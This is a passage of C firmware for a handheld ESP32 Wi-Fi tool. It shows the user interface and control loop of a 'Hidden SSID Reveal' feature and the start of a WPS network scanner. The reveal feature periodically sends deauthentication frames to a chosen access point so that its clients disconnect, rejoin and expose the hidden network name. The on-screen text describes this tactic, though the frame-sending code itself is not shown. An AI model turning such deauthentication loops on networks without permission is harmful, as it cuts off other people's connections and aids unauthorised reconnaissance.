    display_print_line_cstr(&(tft), "Target: All hidden APs");
  } else if (ap) {
    snprintf(buf, sizeof(buf), "Target: %02X:%02X:%02X:%02X:%02X:%02X",
             ap->bssid[0], ap->bssid[1], ap->bssid[2], ap->bssid[3],
             ap->bssid[4], ap->bssid[5]);
    display_print_line_cstr(&(tft), (TEXT(buf)).data);
  }

  display_set_cursor(&(tft), 10, 70);
  if (ap) {
    snprintf(buf, sizeof(buf), "Channel: %u   RSSI: %d", ap->channel, ap->rssi);
  } else {
    snprintf(buf, sizeof(buf), "Hidden APs: %d", HiddenSsidReveal_s_count);
  }
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  if (HiddenSsidReveal_s_forcing) {
    HiddenSsidReveal_fillRevealLine(90, "Status: Forcing reveal", ORANGE);
  } else if (HiddenSsidReveal_s_listening) {
    HiddenSsidReveal_fillRevealLine(90, "Status: Listening", ORANGE);
  } else {
    HiddenSsidReveal_fillRevealLine(90, "Status: Stopped", UI_DIM_TEXT);
  }

  snprintf(buf, sizeof(buf), "Deauth TX: %lu", HiddenSsidReveal_s_deauthSent);
  HiddenSsidReveal_fillRevealLine(110, buf, WHITE);
  snprintf(buf, sizeof(buf), "Mgmt RX: %lu  SSID IE: %lu",
           HiddenSsidReveal_s_mgmtFrames, HiddenSsidReveal_s_ssidHits);
  HiddenSsidReveal_fillRevealLine(125, buf, WHITE);

  display_set_text_color_2(&(tft), GREEN, TFT_BLACK);
  display_set_cursor(&(tft), 10, 150);
  display_print(&(tft), "Revealed SSID:");

  display_fill_rect(&(tft), 0, 168, SCREEN_WIDTH, 14, TFT_BLACK);
  display_set_cursor(&(tft), 10, 168);
  if (ap && ap->has_name) {
    display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
    display_print_line_cstr(&(tft), (TEXT(ap->revealed)).data);
  } else if (HiddenSsidReveal_s_listenAll) {
    int revealed = 0;
    for (int i = 0; i < HiddenSsidReveal_s_count; i++) {
      if (HiddenSsidReveal_s_aps[i].has_name) {
        revealed++;
      }
    }
    display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
    snprintf(buf, sizeof(buf), "%d / %d recovered", revealed,
             HiddenSsidReveal_s_count);
    display_print_line_cstr(&(tft), (TEXT(buf)).data);
  } else {
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_print_line_cstr(&(tft), "(waiting for rejoin...)");
  }

  if (HiddenSsidReveal_s_forcing) {
    HiddenSsidReveal_fillRevealLine(200, "Force: deauth clients so they",
                                    UI_DIM_TEXT);
    HiddenSsidReveal_fillRevealLine(214, "reassociate and leak SSID.",
                                    UI_DIM_TEXT);
  } else {
    HiddenSsidReveal_fillRevealLine(200, "Force kicks clients to elicit",
                                    UI_DIM_TEXT);
    HiddenSsidReveal_fillRevealLine(214, "assoc/probe frames with SSID.",
                                    UI_DIM_TEXT);
  }

  HiddenSsidReveal_s_revealUiDrawn = true;
  HiddenSsidReveal_s_lastDrawnDeauth = HiddenSsidReveal_s_deauthSent;
  HiddenSsidReveal_s_lastDrawnMgmt = HiddenSsidReveal_s_mgmtFrames;
  HiddenSsidReveal_s_lastDrawnHits = HiddenSsidReveal_s_ssidHits;
  HiddenSsidReveal_s_lastDrawnForcing = HiddenSsidReveal_s_forcing;
  HiddenSsidReveal_s_lastDrawnListening = HiddenSsidReveal_s_listening;
  HiddenSsidReveal_s_lastDrawnHasName = ap && ap->has_name;

  const char* buttons[] = {HiddenSsidReveal_s_forcing ? "Stop" : "Force",
                           "Back"};
  HiddenSsidReveal_drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

static void HiddenSsidReveal_drawRevealScreen_0(void) {
  HiddenSsidReveal_drawRevealScreen_1(true);
}

static bool HiddenSsidReveal_scanHiddenNetworks(void) {
  HiddenSsidReveal_stopListening();
  HiddenSsidReveal_s_scanning = true;
  HiddenSsidReveal_s_selectedIndex = -1;
  HiddenSsidReveal_s_listenAll = false;
  HiddenSsidReveal_s_currentPage = 0;
  HiddenSsidReveal_s_currentIndex = 0;
  HiddenSsidReveal_s_lastRenderedIndex = -1;
  HiddenSsidReveal_s_lastRenderedPage = -1;
  HiddenSsidReveal_s_revealUiDrawn = false;
  HiddenSsidReveal_drawScanScreen_1(true);

  // Preserve previously revealed names across rescans.
  HiddenSsidReveal_HiddenAp prev[HiddenSsidReveal_MAX_HIDDEN_APS];
  const int prevCount =
      DIV_MIN(HiddenSsidReveal_s_count, HiddenSsidReveal_MAX_HIDDEN_APS);
  if (prevCount > 0) {
    memcpy(prev, HiddenSsidReveal_s_aps,
           prevCount * sizeof(HiddenSsidReveal_HiddenAp));
  }

  const int n = WifiScan_staWifiScanSync();
  HiddenSsidReveal_s_count = 0;
  if (n <= 0) {
    HiddenSsidReveal_s_scanning = false;
    return false;
  }

  for (int i = 0;
       i < n && HiddenSsidReveal_s_count < HiddenSsidReveal_MAX_HIDDEN_APS;
       i++) {
    text_t ssid = network_ssid(i);
    if (strlen((ssid).data) > 0) {
      continue;
    }
    const uint8_t* bssid = network_bssid(i);
    if (!bssid) {
      continue;
    }

    __auto_type ap = &(HiddenSsidReveal_s_aps[HiddenSsidReveal_s_count]);
    memset(&(*ap), 0, sizeof((*ap)));
    memcpy((*ap).bssid, bssid, 6);
    (*ap).rssi = network_rssi(i);
    (*ap).channel = network_channel(i);
    (*ap).authmode = network_auth_mode(i);
    (*ap).has_name = false;
    (*ap).revealed[0] = '\0';

    for (int j = 0; j < prevCount; j++) {
      if (memcmp(prev[j].bssid, (*ap).bssid, 6) == 0 && prev[j].has_name) {
        strncpy((*ap).revealed, prev[j].revealed, sizeof((*ap).revealed) - 1);
        (*ap).has_name = true;
        break;
      }
    }
    HiddenSsidReveal_s_count++;
  }

  if (HiddenSsidReveal_s_count > 1) {
    qsort(HiddenSsidReveal_s_aps, HiddenSsidReveal_s_count,
          sizeof(HiddenSsidReveal_HiddenAp), HiddenSsidReveal_compareHiddenAp);
  }

  HiddenSsidReveal_s_scanning = false;
  return HiddenSsidReveal_s_count > 0;
}

static void HiddenSsidReveal_openRevealTarget(int index, bool all) {
  if (!all && (index < 0 || index >= HiddenSsidReveal_s_count)) {
    return;
  }
  HiddenSsidReveal_s_listenAll = all;
  HiddenSsidReveal_s_selectedIndex = all ? -1 : index;
  if (!all) {
    HiddenSsidReveal_s_currentIndex = index;
  }

  // Paint first so selection feels instant, then bring radio up.
  HiddenSsidReveal_s_listening = false;
  HiddenSsidReveal_s_forcing = true;
  HiddenSsidReveal_s_mgmtFrames = 0;
  HiddenSsidReveal_s_ssidHits = 0;
  HiddenSsidReveal_s_deauthSent = 0;
  HiddenSsidReveal_drawRevealScreen_1(true);
  HiddenSsidReveal_updateNavLabels(true);
  HiddenSsidReveal_startListening(true);
  HiddenSsidReveal_updateRevealStats();
}

static void HiddenSsidReveal_flushPendingReveal(void) {
  if (!HiddenSsidReveal_s_revealPending) {
    return;
  }

  char ssid[33];
  int index = -1;
  portENTER_CRITICAL(&HiddenSsidReveal_s_revealMux);
  HiddenSsidReveal_s_revealPending = false;
  index = HiddenSsidReveal_s_revealIndex;
  strncpy(ssid, HiddenSsidReveal_s_pendingSsid, sizeof(ssid) - 1);
  ssid[sizeof(ssid) - 1] = '\0';
  portEXIT_CRITICAL(&HiddenSsidReveal_s_revealMux);

  if (index < 0 || index >= HiddenSsidReveal_s_count || !ssid[0]) {
    return;
  }

  strncpy(HiddenSsidReveal_s_aps[index].revealed, ssid,
          sizeof(HiddenSsidReveal_s_aps[index].revealed) - 1);
  HiddenSsidReveal_s_aps[index]
      .revealed[sizeof(HiddenSsidReveal_s_aps[index].revealed) - 1] = '\0';
  HiddenSsidReveal_s_aps[index].has_name = true;
  HiddenSsidReveal_s_forcing = false;
  HiddenSsidReveal_updateRevealStats();
  HiddenSsidReveal_updateNavLabels(true);
}

static void HiddenSsidReveal_handleNavButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - HiddenSsidReveal_s_lastBtnMs < HiddenSsidReveal_BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  const bool onReveal =
      (HiddenSsidReveal_s_selectedIndex >= 0 || HiddenSsidReveal_s_listenAll);

  if (onReveal) {
    if (isButtonPressedEdge(BTN_LEFT)) {
      HiddenSsidReveal_toggleForce();
      HiddenSsidReveal_s_lastBtnMs = now;
      return;
    }
    if (isButtonPressedEdge(BTN_UP) && !HiddenSsidReveal_s_listening) {
      HiddenSsidReveal_startListening(false);
      HiddenSsidReveal_updateRevealStats();
      HiddenSsidReveal_updateNavLabels(true);
      HiddenSsidReveal_s_lastBtnMs = now;
      return;
    }
    if (isButtonPressedEdge(BTN_RIGHT)) {
      HiddenSsidReveal_stopListening();
      HiddenSsidReveal_s_selectedIndex = -1;
      HiddenSsidReveal_s_listenAll = false;
      HiddenSsidReveal_s_revealUiDrawn = false;
      HiddenSsidReveal_drawScanScreen_1(true);
      HiddenSsidReveal_updateNavLabels(false);
      HiddenSsidReveal_s_lastBtnMs = now;
      return;
    }
    return;
  }

  if (HiddenSsidReveal_s_scanning) {
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    HiddenSsidReveal_scanHiddenNetworks();
    HiddenSsidReveal_drawScanScreen_1(true);
    HiddenSsidReveal_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_UP) && HiddenSsidReveal_s_currentIndex > 0) {
    HiddenSsidReveal_s_currentIndex--;
    HiddenSsidReveal_drawScanScreen_1(false);
    HiddenSsidReveal_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN) &&
      HiddenSsidReveal_s_currentIndex < HiddenSsidReveal_s_count - 1) {
    HiddenSsidReveal_s_currentIndex++;
    HiddenSsidReveal_drawScanScreen_1(false);
    HiddenSsidReveal_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT) && HiddenSsidReveal_s_count > 0) {
    HiddenSsidReveal_openRevealTarget(HiddenSsidReveal_s_currentIndex, false);
    HiddenSsidReveal_s_lastBtnMs = now;
  }
}

static void HiddenSsidReveal_handleTouch(void) {
  int x, y;
  if (!readTouchXY(&(x), &(y))) {
    return;
  }

  static unsigned long lastTouchActionMs = 0;
  const unsigned long now = sys_monotonic_ms();
  if (now - lastTouchActionMs < 300) {
    return;
  }

  const bool onReveal =
      (HiddenSsidReveal_s_selectedIndex >= 0 || HiddenSsidReveal_s_listenAll);
  bool redraw = false;

  if (!onReveal) {
    const int listMaxY =
        HiddenSsidReveal_LIST_FIRST_ROW_Y +
        (HiddenSsidReveal_networksPerPage() * HiddenSsidReveal_LIST_ROW_H);
    if (!HiddenSsidReveal_s_scanning &&
        y >= HiddenSsidReveal_LIST_FIRST_ROW_Y && y < listMaxY &&
        HiddenSsidReveal_s_count > 0) {
      int index =
          (y - HiddenSsidReveal_LIST_FIRST_ROW_Y) /
              HiddenSsidReveal_LIST_ROW_H +
          (HiddenSsidReveal_s_currentPage * HiddenSsidReveal_networksPerPage());
      if (index >= 0 && index < HiddenSsidReveal_s_count) {
        HiddenSsidReveal_openRevealTarget(index, false);
        lastTouchActionMs = now;
      }
    } else if (!featureHasTouchNavBar() && !HiddenSsidReveal_s_scanning &&
               y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        HiddenSsidReveal_drawButton(0, 304, 57, 16, "Rescan", true, false);
        HiddenSsidReveal_scanHiddenNetworks();
        HiddenSsidReveal_drawScanScreen_0();
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 122 && x <= 179 && HiddenSsidReveal_s_currentIndex > 0) {
        HiddenSsidReveal_drawButton(117, 304, 57, 16, "Prev", true, false);
        HiddenSsidReveal_s_currentIndex--;
        HiddenSsidReveal_drawScanScreen_1(false);
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 183 && x <= 240 &&
                 HiddenSsidReveal_s_currentIndex <
                     HiddenSsidReveal_s_count - 1) {
        HiddenSsidReveal_drawButton(178, 304, 57, 16, "Next", true, false);
        HiddenSsidReveal_s_currentIndex++;
        HiddenSsidReveal_drawScanScreen_1(false);
        lastTouchActionMs = now;
        redraw = true;
      }
    }
  } else {
    if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        HiddenSsidReveal_drawButton(
            0, 304, 57, 16, HiddenSsidReveal_s_forcing ? "Stop" : "Force", true,
            false);
        HiddenSsidReveal_toggleForce();
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 183 && x <= 240) {
        HiddenSsidReveal_drawButton(177, 304, 57, 16, "Back", true, false);
        HiddenSsidReveal_stopListening();
        HiddenSsidReveal_s_selectedIndex = -1;
        HiddenSsidReveal_s_listenAll = false;
        HiddenSsidReveal_s_revealUiDrawn = false;
        HiddenSsidReveal_drawScanScreen_1(true);
        HiddenSsidReveal_updateNavLabels(false);
        lastTouchActionMs = now;
        redraw = true;
      }
    }
  }

  if (redraw) {
    sys_sleep_ms(50);
  }
}

static void HiddenSsidReveal_runUI(void) {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_undo,
                                                 bitmap_icon_go_back};

  if (!HiddenSsidReveal_s_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    HiddenSsidReveal_s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        HiddenSsidReveal_stopListening();
        HiddenSsidReveal_s_selectedIndex = -1;
        HiddenSsidReveal_s_listenAll = false;
        HiddenSsidReveal_s_revealUiDrawn = false;
        HiddenSsidReveal_scanHiddenNetworks();
        HiddenSsidReveal_drawScanScreen_1(true);
        HiddenSsidReveal_updateNavLabels(false);
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void HiddenSsidReveal_hopChannelsIfNeeded(void) {
  if (!HiddenSsidReveal_s_listening || !HiddenSsidReveal_s_listenAll ||
      HiddenSsidReveal_s_count <= 1) {
    return;
  }
  if (sys_monotonic_ms() - HiddenSsidReveal_s_lastHopMs <
      HiddenSsidReveal_LISTEN_HOP_MS) {
    return;
  }
  HiddenSsidReveal_s_lastHopMs = sys_monotonic_ms();
  HiddenSsidReveal_s_hopPos =
      (HiddenSsidReveal_s_hopPos + 1) % HiddenSsidReveal_s_count;
  uint8_t ch = HiddenSsidReveal_s_aps[HiddenSsidReveal_s_hopPos].channel;
  if (ch < 1 || ch > 14) {
    ch = 1;
  }
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void HiddenSsidReveal_teardown(void) {
  HiddenSsidReveal_stopListening();
  network_clear_scan();
  network_disconnect_options(true, true);
  HiddenSsidReveal_s_selectedIndex = -1;
  HiddenSsidReveal_s_listenAll = false;
  HiddenSsidReveal_s_scanning = false;
  HiddenSsidReveal_s_revealPending = false;
}

void HiddenSsidReveal_hiddenSsidSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  HiddenSsidReveal_updateNavLabels(false);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  HiddenSsidReveal_s_uiDrawn = false;
  HiddenSsidReveal_s_count = 0;
  HiddenSsidReveal_s_currentIndex = 0;
  HiddenSsidReveal_s_currentPage = 0;
  HiddenSsidReveal_s_selectedIndex = -1;
  HiddenSsidReveal_s_listenAll = false;
  HiddenSsidReveal_s_listening = false;
  HiddenSsidReveal_s_forcing = false;
  HiddenSsidReveal_s_scanning = false;
  HiddenSsidReveal_s_mgmtFrames = 0;
  HiddenSsidReveal_s_ssidHits = 0;
  HiddenSsidReveal_s_deauthSent = 0;
  HiddenSsidReveal_s_revealPending = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();
  HiddenSsidReveal_runUI();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  display_set_text_color_2(&(tft), GREEN, BLACK);
  display_set_text_size(&(tft), 1);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), "Initializing...");

  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(false, false);
  sys_sleep_ms(50);

  HiddenSsidReveal_scanHiddenNetworks();
  HiddenSsidReveal_drawScanScreen_0();
  redrawTouchButtonBar();
}

void HiddenSsidReveal_hiddenSsidLoop(void) {
  if (feature_exit_requested) {
    HiddenSsidReveal_teardown();
    return;
  }

  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    HiddenSsidReveal_teardown();
    feature_exit_requested = true;
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  HiddenSsidReveal_handleNavButtons();
  HiddenSsidReveal_handleTouch();
  HiddenSsidReveal_flushPendingReveal();
  HiddenSsidReveal_hopChannelsIfNeeded();
  updateStatusBar();
  HiddenSsidReveal_runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    HiddenSsidReveal_teardown();
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  const bool onReveal =
      (HiddenSsidReveal_s_selectedIndex >= 0 || HiddenSsidReveal_s_listenAll);
  const uint32_t now = sys_monotonic_ms();

  if (onReveal && HiddenSsidReveal_s_forcing && HiddenSsidReveal_s_listening &&
      HiddenSsidReveal_s_selectedIndex >= 0 &&
      HiddenSsidReveal_s_selectedIndex < HiddenSsidReveal_s_count) {
    if (now - HiddenSsidReveal_s_lastDeauthMs >=
        HiddenSsidReveal_DEAUTH_INTERVAL_MS) {
      HiddenSsidReveal_sendForceDeauth(
          HiddenSsidReveal_s_aps[HiddenSsidReveal_s_selectedIndex].bssid,
          HiddenSsidReveal_s_aps[HiddenSsidReveal_s_selectedIndex].channel);
      HiddenSsidReveal_s_lastDeauthMs = now;
    }
  }

  if (onReveal && HiddenSsidReveal_s_listening) {
    if (now - HiddenSsidReveal_s_lastStatusMs > 500) {
      HiddenSsidReveal_updateRevealStats();
      HiddenSsidReveal_s_lastStatusMs = now;
    }
  }
}

#undef SCREEN_WIDTH
#define SCREEN_WIDTH 240
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#undef STATUS_BAR_HEIGHT
#define STATUS_BAR_HEIGHT 16
#undef ICON_SIZE
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

enum { WpsScanner_LIST_HEADER_Y = 50 };
enum { WpsScanner_LIST_FIRST_ROW_Y = WpsScanner_LIST_HEADER_Y + 20 };
enum { WpsScanner_LIST_ROW_H = 22 };
enum { WpsScanner_MAX_WPS_APS = 48 };
static const unsigned long WpsScanner_BTN_DEBOUNCE_MS = 200;

typedef struct WpsScanner_WpsAp {
  char ssid[33];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  wifi_auth_mode_t authmode;
} WpsScanner_WpsAp;
#define WpsScanner_WpsAp_INITIALIZER {0}
;

static WpsScanner_WpsAp WpsScanner_s_aps[WpsScanner_MAX_WPS_APS];
static int WpsScanner_s_count = 0;
static int WpsScanner_s_currentIndex = 0;
static int WpsScanner_s_currentPage = 0;
static bool WpsScanner_s_scanning = false;
static bool WpsScanner_s_uiDrawn = false;
static unsigned long WpsScanner_s_lastBtnMs = 0;
static int WpsScanner_s_lastRenderedIndex = -1;
static int WpsScanner_s_lastRenderedPage = -1;

static void WpsScanner_drawScanScreen(bool fullRedraw);
static void WpsScanner_updateNavLabels(void);
static void WpsScanner_runScan(void);

static int WpsScanner_networksPerPage(void) {
  return DIV_MAX(1, (wifiListBottomY() - WpsScanner_LIST_FIRST_ROW_Y) /
                        WpsScanner_LIST_ROW_H);
}

static void WpsScanner_updateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels("Rescan", "Next", "Exit", "Prev", NULL);
  redrawTouchButtonBar();
}

static void WpsScanner_drawButton(int x, int y, int w, int h, const char* label,
                                  bool highlight, bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

static void WpsScanner_drawTabBar(const char* leftButton, bool leftDisabled,
                                  const char* prevButton, bool prevDisabled,
                                  const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    WpsScanner_updateNavLabels();
    return;
  }
  display_fill_rect(&(tft), 0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) {
    WpsScanner_drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  }
  if (prevButton && prevButton[0]) {
    WpsScanner_drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    WpsScanner_drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
  }
}

static int WpsScanner_compareWpsAp(const void* a, const void* b) {
  const WpsScanner_WpsAp* ap1 = (const WpsScanner_WpsAp*)a;
  const WpsScanner_WpsAp* ap2 = (const WpsScanner_WpsAp*)b;
  return (int)ap2->rssi - (int)ap1->rssi;
}

static const char* WpsScanner_authShort(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA*";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "ENT";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:
      return "WPA3*";
    default:
      return "?";
  }
}

static void WpsScanner_truncCopy(char* dst, size_t dstSz, const char* src,
                                 size_t maxChars) {
  if (!dst || dstSz == 0) {
    return;
  }
  if (!src) {
    dst[0] = '\0';
    return;
  }
  size_t n = strlen(src);
  if (n > maxChars) {
    n = maxChars;
  }
  if (n >= dstSz) {
    n = dstSz - 1;
  }
  memcpy(dst, src, n);
  dst[n] = '\0';
}

static void WpsScanner_drawApRow(int i, int y, bool isSel) {
  char buf[64];
  char name[16];
  if (WpsScanner_s_aps[i].ssid[0]) {
    WpsScanner_truncCopy(name, sizeof(name), WpsScanner_s_aps[i].ssid, 11);
    if (strlen(WpsScanner_s_aps[i].ssid) > 11) {
      strcat(name, "...");
    }
  } else {
    snprintf(name, sizeof(name), "(hidden)");
  }

  snprintf(buf, sizeof(buf), "%02d: %-14s %3d Ch%2d %s", i + 1, name,
           (int)WpsScanner_s_aps[i].rssi, (int)WpsScanner_s_aps[i].channel,
           WpsScanner_authShort(WpsScanner_s_aps[i].authmode));

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, WpsScanner_LIST_ROW_H,
                    TFT_BLACK);
  display_set_cursor(&(tft), 2, y);
  display_set_text_color_1(&(tft), isSel ? ORANGE : FEATURE_BG);
  display_print(&(tft), (TEXT(isSel ? ">" : " ")).data);
  display_set_cursor(&(tft), 10, y);
  display_set_text_color_1(&(tft), isSel ? ORANGE : WHITE);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);
}

static void WpsScanner_displayScanning(void) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  WpsScanner_s_lastRenderedIndex = -1;
  WpsScanner_s_lastRenderedPage = -1;
  display_set_text_size(&(tft), 1);
  display_set_text_color_1(&(tft), GREEN);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), "Scanning.");
  loading(100, ORANGE, 0, 0, 3, true);
  display_set_cursor(&(tft), 10, 65);
  display_print_line_cstr(&(tft), "Looking for WPS APs.");
}

static void WpsScanner_drawScanScreen(bool fullRedraw) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  display_set_text_size(&(tft), 1);

  if (WpsScanner_s_scanning) {
    WpsScanner_displayScanning();
    return;
  }

  if (WpsScanner_s_count == 0) {
    wifiClearBody(TFT_BLACK);
    WpsScanner_s_lastRenderedIndex = -1;
    WpsScanner_s_lastRenderedPage = -1;
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, 50);
    display_print_line_cstr(&(tft), "No WPS networks found.");
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Press Rescan.");
    WpsScanner_drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int perPage = WpsScanner_networksPerPage();
  if (WpsScanner_s_currentIndex < 0) {
    WpsScanner_s_currentIndex = 0;
  }
  if (WpsScanner_s_currentIndex >= WpsScanner_s_count) {
    WpsScanner_s_currentIndex = DIV_MAX(0, WpsScanner_s_count - 1);
  }
  WpsScanner_s_currentPage = WpsScanner_s_currentIndex / DIV_MAX(1, perPage);

  const bool pageChanged =
      (WpsScanner_s_currentPage != WpsScanner_s_lastRenderedPage);
  const bool needFull =
      fullRedraw || pageChanged || (WpsScanner_s_lastRenderedIndex < 0);

  if (!needFull &&
      WpsScanner_s_lastRenderedIndex != WpsScanner_s_currentIndex) {
    const int prev = WpsScanner_s_lastRenderedIndex;
    const int now = WpsScanner_s_currentIndex;
    const int start = WpsScanner_s_currentPage * perPage;
    if (prev >= start && prev < start + perPage) {
      WpsScanner_drawApRow(
          prev,
          WpsScanner_LIST_FIRST_ROW_Y + (prev - start) * WpsScanner_LIST_ROW_H,
          false);
    }
    if (now >= start && now < start + perPage) {
      WpsScanner_drawApRow(
          now,
          WpsScanner_LIST_FIRST_ROW_Y + (now - start) * WpsScanner_LIST_ROW_H,
          true);
    }
    WpsScanner_s_lastRenderedIndex = WpsScanner_s_currentIndex;
    return;
  }

  if (!needFull) {
    return;
  }

  wifiClearBody(TFT_BLACK);

  display_set_text_color_1(&(tft), GREEN);
  display_set_cursor(&(tft), 10, WpsScanner_LIST_HEADER_Y);
  display_print_line_cstr(&(tft), "WPS Networks:");

  char page_buf[32];
  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
           WpsScanner_s_currentPage + 1,
           DIV_MAX(1, (WpsScanner_s_count + perPage - 1) / perPage));
  display_set_cursor(&(tft), 180, WpsScanner_LIST_HEADER_Y);
  display_set_text_color_1(&(tft), GREEN);
  display_print_line_cstr(&(tft), (TEXT(page_buf)).data);

  int y = WpsScanner_LIST_FIRST_ROW_Y;
  const int start_index = WpsScanner_s_currentPage * perPage;
  const int end_index = DIV_MIN(start_index + perPage, WpsScanner_s_count);
  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
    WpsScanner_drawApRow(i, y, i == WpsScanner_s_currentIndex);
    y += WpsScanner_LIST_ROW_H;
  }

  WpsScanner_drawTabBar("Rescan", false, "Prev", WpsScanner_s_currentIndex <= 0,
                        "Next",
                        WpsScanner_s_currentIndex >= WpsScanner_s_count - 1);
  WpsScanner_s_lastRenderedIndex = WpsScanner_s_currentIndex;
  WpsScanner_s_lastRenderedPage = WpsScanner_s_currentPage;
}

static void WpsScanner_runScan(void) {
  WpsScanner_s_scanning = true;
  WpsScanner_s_count = 0;
  WpsScanner_s_currentIndex = 0;
  WpsScanner_s_currentPage = 0;
  WpsScanner_s_lastRenderedPage = -1;
  WpsScanner_displayScanning();
  WpsScanner_updateNavLabels();

  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(true, true);
  sys_sleep_ms(40);
  network_clear_scan();

  const uint32_t dwell = wifiStaScanMsPerChannel();
  const int n = network_scan(false, true, false, dwell);

  if (n > 0) {
    uint16_t apNum = (uint16_t)n;
    wifi_ap_record_t* rec =
        (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * apNum);
    if (rec) {
